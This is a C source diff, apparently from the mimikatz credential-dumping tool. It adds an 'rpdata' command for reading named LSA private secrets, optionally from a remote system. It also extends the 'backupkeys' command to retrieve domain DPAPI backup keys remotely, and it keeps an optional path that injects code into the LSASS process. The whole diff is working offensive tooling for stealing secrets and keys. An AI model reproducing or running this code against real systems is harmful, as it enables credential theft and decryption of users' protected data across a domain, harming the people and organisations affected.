@@ -13,6 +13,7 @@ const KUHL_M_C kuhl_m_c_lsadump[] = {
 	{kuhl_m_lsadump_trust,	L"trust",		L"Ask LSA Server to retrieve Trust Auth Information (normal or patch on the fly)"},
 	{kuhl_m_lsadump_hash,	L"hash",		NULL},
 	{kuhl_m_lsadump_bkey,	L"backupkeys",	NULL},
+	{kuhl_m_lsadump_rpdata,	L"rpdata",		NULL},
 };
 
 const KUHL_M kuhl_m_lsadump = {
@@ -1591,14 +1592,14 @@ NTSTATUS kuhl_m_lsadump_hash(int argc, wchar_t * argv[])
 	return STATUS_SUCCESS;
 }
 
-NTSTATUS kuhl_m_lsadump_LsaRetrievePrivateData(PCWSTR secretName, PUNICODE_STRING secret)
+NTSTATUS kuhl_m_lsadump_LsaRetrievePrivateData(PCWSTR systemName, PCWSTR secretName, PUNICODE_STRING secret, BOOL isInject)
 {
-	NTSTATUS status = STATUS_UNSUCCESSFUL;
+#ifdef LSARPDATA
 	PKULL_M_MEMORY_HANDLE hMemory = NULL;	
 	PREMOTE_LIB_INPUT_DATA iData;
 	REMOTE_LIB_OUTPUT_DATA oData;
 	KULL_M_MEMORY_ADDRESS aRemoteFunc;
-
+	
 	REMOTE_EXT extensions[] = {
 		{szAdvapi32,"LsaOpenPolicy",			(PVOID) 0x4141414141414141, NULL},
 		{szAdvapi32,"LsaClose",					(PVOID) 0x4242424242424242, NULL},
@@ -1608,36 +1609,69 @@ NTSTATUS kuhl_m_lsadump_LsaRetrievePrivateData(PCWSTR secretName, PUNICODE_STRIN
 		{szNtDll,	"memcpy",					(PVOID) 0x4c4c4c4c4c4c4c4c, NULL},
 	};
 	MULTIPLE_REMOTE_EXT extForCb = {ARRAYSIZE(extensions), extensions};
+#endif
+	NTSTATUS status = STATUS_UNSUCCESSFUL;
+	LSA_OBJECT_ATTRIBUTES oa = {0};
+	LSA_HANDLE hPolicy;
+	UNICODE_STRING name, system, *data;
 
-	if(kuhl_m_lsadump_lsa_getHandle(&hMemory, PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_QUERY_INFORMATION | PROCESS_CREATE_THREAD))
+	if(secretName)
 	{
-		if(kull_m_remotelib_CreateRemoteCodeWitthPatternReplace(hMemory, kuhl_lsadump_RetrievePrivateData_thread, (DWORD) ((PBYTE) kuhl_lsadump_RetrievePrivateData_thread_end - (PBYTE) kuhl_lsadump_RetrievePrivateData_thread), &extForCb, &aRemoteFunc))
+#ifdef LSARPDATA
+		if(isInject)
 		{
-			if(iData = kull_m_remotelib_CreateInput(NULL, 0, (DWORD) wcslen(secretName) * sizeof(wchar_t), secretName))
+
+			if(kuhl_m_lsadump_lsa_getHandle(&hMemory, PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_QUERY_INFORMATION | PROCESS_CREATE_THREAD))
 			{
-				if(kull_m_remotelib_create(&aRemoteFunc, iData, &oData))
+				if(kull_m_remotelib_CreateRemoteCodeWitthPatternReplace(hMemory, kuhl_lsadump_RetrievePrivateData_thread, (DWORD) ((PBYTE) kuhl_lsadump_RetrievePrivateData_thread_end - (PBYTE) kuhl_lsadump_RetrievePrivateData_thread), &extForCb, &aRemoteFunc))
 				{
-					status = oData.outputStatus;
-					if(NT_SUCCESS(status) && oData.outputSize && oData.outputData)
+					if(iData = kull_m_remotelib_CreateInput(NULL, 0, (DWORD) wcslen(secretName) * sizeof(wchar_t), secretName))
 					{
-						secret->Length = secret->MaximumLength = (USHORT) oData.outputSize;
-						if(secret->Buffer = (PWSTR) LocalAlloc(LPTR, secret->MaximumLength))
-							RtlCopyMemory(secret->Buffer, oData.outputData, secret->MaximumLength);
+						if(kull_m_remotelib_create(&aRemoteFunc, iData, &oData))
+						{
+							status = oData.outputStatus;
+							if(NT_SUCCESS(status) && oData.outputSize && oData.outputData)
+							{
+								secret->Length = secret->MaximumLength = (USHORT) oData.outputSize;
+								if(secret->Buffer = (PWSTR) LocalAlloc(LPTR, secret->MaximumLength))
+									RtlCopyMemory(secret->Buffer, oData.outputData, secret->MaximumLength);
 
-						LocalFree(oData.outputData);
+								LocalFree(oData.outputData);
+							}
+						}
+						LocalFree(iData);
 					}
+					kull_m_memory_free(&aRemoteFunc, 0);
 				}
-				LocalFree(iData);
+				else PRINT_ERROR(L"kull_m_remotelib_CreateRemoteCodeWitthPatternReplace\n");
+
+				if(hMemory->pHandleProcess->hProcess)
+					CloseHandle(hMemory->pHandleProcess->hProcess);
+				kull_m_memory_close(hMemory);
 			}
-			kull_m_memory_free(&aRemoteFunc, 0);
 		}
-		else PRINT_ERROR(L"kull_m_remotelib_CreateRemoteCodeWitthPatternReplace\n");
-
-		if(hMemory->pHandleProcess->hProcess)
-			CloseHandle(hMemory->pHandleProcess->hProcess);
-		kull_m_memory_close(hMemory);
+		else
+		{
+#endif
+			RtlInitUnicodeString(&name, secretName);
+			RtlInitUnicodeString(&system, systemName);
+			status = LsaOpenPolicy(&system, &oa, POLICY_GET_PRIVATE_INFORMATION, &hPolicy);
+			if(NT_SUCCESS(status))
+			{
+				status = LsaRetrievePrivateData(hPolicy, &name, &data);
+				if(NT_SUCCESS(status))
+				{
+					*secret = *data;
+					if(secret->Buffer = (PWSTR) LocalAlloc(LPTR, secret->MaximumLength))
+						RtlCopyMemory(secret->Buffer, data->Buffer, secret->MaximumLength);
+					LsaFreeMemory(data);
+				}
+				LsaClose(hPolicy);
+			}
+#ifdef LSARPDATA
+		}
+#endif
 	}
-
 	return status;
 }
 
@@ -1713,7 +1747,7 @@ void kuhl_m_lsadump_analyzeKey(LPCGUID guid, PKIWI_BACKUP_KEY secret, DWORD size
 	}
 }
 
-NTSTATUS kuhl_m_lsadump_getKeyFromGUID(LPCGUID guid, BOOL isExport)
+NTSTATUS kuhl_m_lsadump_getKeyFromGUID(LPCGUID guid, BOOL isExport, LPCWSTR systemName, BOOL isInject)
 {
 	NTSTATUS status = STATUS_UNSUCCESSFUL;
 	UNICODE_STRING secret;
@@ -1725,7 +1759,7 @@ NTSTATUS kuhl_m_lsadump_getKeyFromGUID(LPCGUID guid, BOOL isExport)
 		RtlCopyMemory(keyName + 11, secret.Buffer + 1, 36 * sizeof(wchar_t));
 		RtlFreeUnicodeString(&secret);
 		
-		status = kuhl_m_lsadump_LsaRetrievePrivateData(keyName, &secret);
+		status = kuhl_m_lsadump_LsaRetrievePrivateData(systemName, keyName, &secret, isInject);
 		if(NT_SUCCESS(status))
 		{
 			kuhl_m_lsadump_analyzeKey(guid, (PKIWI_BACKUP_KEY) secret.Buffer, secret.Length, isExport);
@@ -1741,9 +1775,11 @@ NTSTATUS kuhl_m_lsadump_bkey(int argc, wchar_t * argv[])
 	NTSTATUS status;
 	UNICODE_STRING secret;
 	GUID guid;
-	PCWCHAR szGuid = NULL;
+	PCWCHAR szGuid = NULL, szSystem = NULL;
 	BOOL export = kull_m_string_args_byName(argc, argv, L"export", NULL, NULL);
-	
+	BOOL isInject = kull_m_string_args_byName(argc, argv, L"inject", NULL, NULL);
+
+	kull_m_string_args_byName(argc, argv, L"system", &szSystem, NULL);
 	kull_m_string_args_byName(argc, argv, L"guid", &szGuid, NULL);
 	if(szGuid)
 	{
@@ -1752,28 +1788,49 @@ NTSTATUS kuhl_m_lsadump_bkey(int argc, wchar_t * argv[])
 		if(NT_SUCCESS(status))
 		{
 			kprintf(L"\n"); kull_m_string_displayGUID(&guid); kprintf(L" seems to be a valid GUID\n");
-			kuhl_m_lsadump_getKeyFromGUID(&guid, export);
+			kuhl_m_lsadump_getKeyFromGUID(&guid, export, szSystem, isInject);
 		}
 		else PRINT_ERROR(L"Invalide GUID (0x%08x) ; %s\n", status, szGuid);
 	}
 	else
 	{
 		kprintf(L"\nCurrent prefered key:       ");
-		status = kuhl_m_lsadump_LsaRetrievePrivateData(L"G$BCKUPKEY_PREFERRED", &secret);
+		status = kuhl_m_lsadump_LsaRetrievePrivateData(szSystem, L"G$BCKUPKEY_PREFERRED", &secret, isInject);
 		if(NT_SUCCESS(status))
 		{
 			kull_m_string_displayGUID((LPCGUID) secret.Buffer); kprintf(L"\n");
-			kuhl_m_lsadump_getKeyFromGUID((LPCGUID) secret.Buffer, export);
+			kuhl_m_lsadump_getKeyFromGUID((LPCGUID) secret.Buffer, export, szSystem, isInject);
 			LocalFree(secret.Buffer);
 		}
 		else PRINT_ERROR(L"kuhl_m_lsadump_LsaRetrievePrivateData: 0x%08x\n", status);
 
 		kprintf(L"\nCompatibility prefered key: ");
-		status = kuhl_m_lsadump_LsaRetrievePrivateData(L"G$BCKUPKEY_P", &secret);
+		status = kuhl_m_lsadump_LsaRetrievePrivateData(szSystem, L"G$BCKUPKEY_P", &secret, isInject);
 		if(NT_SUCCESS(status))
 		{
 			kull_m_string_displayGUID((LPCGUID) secret.Buffer); kprintf(L"\n");
-			kuhl_m_lsadump_getKeyFromGUID((LPCGUID) secret.Buffer, export);
+			kuhl_m_lsadump_getKeyFromGUID((LPCGUID) secret.Buffer, export, szSystem, isInject);
+			LocalFree(secret.Buffer);
+		}
+		else PRINT_ERROR(L"kuhl_m_lsadump_LsaRetrievePrivateData: 0x%08x\n", status);
+	}
+	return STATUS_SUCCESS;
+}
+
+NTSTATUS kuhl_m_lsadump_rpdata(int argc, wchar_t * argv[])
+{
+	NTSTATUS status;
+	UNICODE_STRING secret;
+	LPCWSTR szName, szSystem = NULL;
+	BOOL export = kull_m_string_args_byName(argc, argv, L"export", NULL, NULL); // todo
+	BOOL isInject = kull_m_string_args_byName(argc, argv, L"inject", NULL, NULL);
+	if(kull_m_string_args_byName(argc, argv, L"name", &szName, NULL))
+	{
+		kull_m_string_args_byName(argc, argv, L"system", &szSystem, NULL);
+		status = kuhl_m_lsadump_LsaRetrievePrivateData(szSystem, szName, &secret, isInject);
+		if(NT_SUCCESS(status))
+		{
+			kull_m_string_wprintf_hex(secret.Buffer, secret.Length, 1 | (16<<16));
 			LocalFree(secret.Buffer);
 		}
 		else PRINT_ERROR(L"kuhl_m_lsadump_LsaRetrievePrivateData: 0x%08x\n", status);
